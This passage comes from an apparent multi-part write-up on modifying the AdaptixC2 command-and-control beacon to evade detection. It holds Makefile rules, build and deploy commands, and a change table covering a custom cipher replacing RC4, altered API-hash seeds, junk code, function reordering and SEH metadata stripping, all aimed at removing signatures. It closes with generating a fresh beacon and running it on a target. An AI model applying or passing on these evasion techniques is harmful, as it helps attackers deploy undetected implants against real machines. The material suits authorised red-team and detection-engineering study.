	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_DNS -c $< -o $@

# Miniz: compile with trim macros for ALL beacon types to eliminate CRT deps
$(HTTP_DIST_DIR)/miniz.x64.o: beacon/miniz.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_HTTP $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(HTTP_DIST_DIR)/miniz.x86.o: beacon/miniz.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_HTTP $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(SMB_DIST_DIR)/miniz.x64.o: beacon/miniz.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_SMB $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(SMB_DIST_DIR)/miniz.x86.o: beacon/miniz.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_SMB $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(TCP_DIST_DIR)/miniz.x64.o: beacon/miniz.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_TCP $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(TCP_DIST_DIR)/miniz.x86.o: beacon/miniz.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_TCP $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(DNS_DIST_DIR)/miniz.x64.o: beacon/miniz.cpp
	@$(CXX_X64) -c $(COMMON_FLAGS) -D BEACON_DNS $(MINIZ_TRIM_FLAGS) -c $< -o $@

$(DNS_DIST_DIR)/miniz.x86.o: beacon/miniz.cpp
	@$(CXX_X86) -c $(COMMON_FLAGS) -D BEACON_DNS $(MINIZ_TRIM_FLAGS) -c $< -o $@
```

---

## The Listener Plugin Bug

### What Happened

After rebuilding everything, the beacon ran fine on target. `tcpdump` confirmed TLS traffic was flowing. But the agent never appeared in the teamserver UI.

### Finding the Root Cause

I had updated the **agent plugin** cipher but forgot the **listener plugin**. The listener decrypts the first heartbeat to register the agent. It was still using `crypto/rc4`, so it got garbage, couldn't parse the agent info, and silently returned a 404. The beacon retried forever.

### The Fix

Added `streamCipherCrypt` to all four listener plugins and replaced their `crypto/rc4` calls. In each plugin:
- Removed `"crypto/rc4"` from the import block
- Added the `streamCipherCrypt` function
- Replaced `rc4.NewCipher()`/`XORKeyStream()` with `streamCipherCrypt()`

The files and where the cipher code lives:
- **HTTP**: `beacon_listener_http/pl_transport.go` (heartbeat decrypt in `AgentHandler`)
- **SMB**: `beacon_listener_smb/pl_main.go` (heartbeat decrypt in `InternalHandler`)
- **TCP**: `beacon_listener_tcp/pl_main.go` (heartbeat decrypt in `InternalHandler`)
- **DNS**: `beacon_listener_dns/pl_transport.go` (had an `rc4Crypt` wrapper used in 5 places, rewrote it to call `streamCipherCrypt` internally)

The `streamCipherCrypt` function is identical in all four plugins (same as the one in `pl_utils.go` from [Server-Side Cipher - pl_utils.go](#server-side-cipher---pl_utilsgo)).

### The GOEXPERIMENT Build Flag Problem

After rebuilding the listener plugins, the teamserver refused to load them:

```
failed to open plugin listener_beacon_http.so: plugin was built with a different version of package internal/goexperiment
```

Go plugins must be built with the exact same `GOEXPERIMENT` flags as the binary that loads them. Check what the server needs with `go version /opt/AdaptixC2/dist/adaptixserver` and export those flags before every `go build`.

---

## Full Build and Deploy (Step by Step)

### Understanding What Gets Built

Three things need rebuilding when the cipher changes:

1. **C++ beacon objects** (`.o` files) - cross-compiled with MinGW, linked into beacons at generation time
2. **Go agent plugin** (`agent_beacon.so`) - encrypts profiles, decrypts beacon traffic
3. **Go listener plugins** (HTTP, SMB, TCP, DNS `.so` files) - decrypt heartbeats to register agents

If you only rebuild some of these, you get a cipher mismatch and the beacon silently fails.

### Edit All Source Files on the Server

Apply all changes from this post to the files under `/opt/AdaptixC2/`. How you transfer them is up to you (`scp`, `rsync`, git, direct editing, etc.). See the [Files I Modified](#files-i-modified) table for the full list.

### Regenerate the Hash Constants

```bash
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon/files
python3 hashes.py > ../beacon/ApiDefines.h
```

### Rebuild the C++ Beacon Objects

```bash
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon
make clean && make
```

### Copy the New Objects to the Runtime Directory

```bash
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent/src_beacon
cp objects_http/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_http/
cp objects_smb/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_smb/
cp objects_tcp/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_tcp/
cp objects_dns/* /opt/AdaptixC2/dist/extenders/beacon_agent/objects_dns/
```

### Rebuild the Agent Plugin

**Do NOT run `make` from the `beacon_agent/` Makefile.** It does `rm -rf dist` and wipes your runtime directory.

First, check what `GOEXPERIMENT` flags the server binary needs:

```bash
go version /opt/AdaptixC2/dist/adaptixserver
```

Look for the `X:` part (e.g. `X:jsonv2,greenteagc`). Set it and build:

```bash
export GOEXPERIMENT=jsonv2,greenteagc
cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_agent
go build -buildmode=plugin -ldflags="-s -w" \
    -o /opt/AdaptixC2/dist/extenders/beacon_agent/agent_beacon.so \
    pl_main.go pl_packer.go pl_utils.go pl_sideloading.go
```

### Rebuild All Listener Plugins

Same `GOEXPERIMENT` value as above:

```bash
export GOEXPERIMENT=jsonv2,greenteagc

cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_listener_http
go build -buildmode=plugin \
    -o /opt/AdaptixC2/dist/extenders/beacon_listener_http/listener_beacon_http.so .

cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_listener_smb
go build -buildmode=plugin \
    -o /opt/AdaptixC2/dist/extenders/beacon_listener_smb/listener_beacon_smb.so .

cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_listener_tcp
go build -buildmode=plugin \
    -o /opt/AdaptixC2/dist/extenders/beacon_listener_tcp/listener_beacon_tcp.so .

cd /opt/AdaptixC2/AdaptixServer/extenders/beacon_listener_dns
go build -buildmode=plugin \
    -o /opt/AdaptixC2/dist/extenders/beacon_listener_dns/listener_beacon_dns.so .
```

### Restart the Teamserver

```bash
pkill adaptixserver
sleep 2
cd /opt/AdaptixC2/dist
nohup ./adaptixserver -profile profile.yaml > /tmp/adaptix.log 2>&1 &
sleep 3
cat /tmp/adaptix.log
```

You should see your listeners starting and "The AdaptixC2 server is ready" with no plugin errors. If you get a `goexperiment` version mismatch, re-check your `GOEXPERIMENT` export.

### Generate and Test

Generate a fresh beacon from the UI (old beacons use old objects), transfer it to the target, and execute. If the agent doesn't appear, check [The Listener Plugin Bug](#the-listener-plugin-bug) and [The GOEXPERIMENT Build Flag Problem](#the-goexperiment-build-flag-problem).

---

## Summary of All Changes

| Change | Files | What It Does |
|--------|-------|-------------|
| Custom stream cipher | `Crypt.cpp`, `Crypt.h`, `Agent.cpp`, `AgentConfig.cpp`, all 4 `Connector*.cpp`, `pl_utils.go` | Gets rid of the RC4 byte signature in the compiled code |
| DJB2 seed 1572 to 7349 | `ProcLoader.cpp`, `hashes.py`, `ApiDefines.h` | Changes all 200+ hash constants in the data section |
| hashes.py null byte fix | `hashes.py` | Library define names now generate correctly |
| 4 missing function hashes | `hashes.py` | Added TryEnterCriticalSection, ResetEvent, CreateProcessWithTokenW, BeaconGetStopJobEvent |
| printf DEBUG guard | `hashes.py` | printf hash only shows up in debug builds |
| Variable renames | `ProcLoader.cpp`, `Encoders.cpp` | May change which CPU registers the compiler picks |
| Function reordering | `MainAgent.cpp`, `WaitMask.cpp`, `Encoders.cpp` | Shifts function positions in the compiled binary |
| Junk code | `MainAgent.cpp`, `WaitMask.cpp` | Adds real instructions between functional code blocks |
| SEH metadata stripping | `Makefile` | Removes .pdata/.xdata UNWIND_INFO fingerprint from all .o files |
| Listener plugin cipher fix | `pl_transport.go` (HTTP, DNS), `pl_main.go` (SMB, TCP) | Fixes the silent heartbeat decryption failure |

All C++ beacon source paths are under: `AdaptixServer/extenders/beacon_agent/src_beacon/`
All Go plugin source paths are under: `AdaptixServer/extenders/`
All compiled plugin outputs go to: `dist/extenders/`

**Total files modified: 20** (12 C++ source, 1 Makefile, 1 Python, 5 Go, 1 auto-generated)

---

**Previous:** [Part 3: Beacon Source Modifications](writeup.html?file=writeups/adaptix-beacon-mods.md)
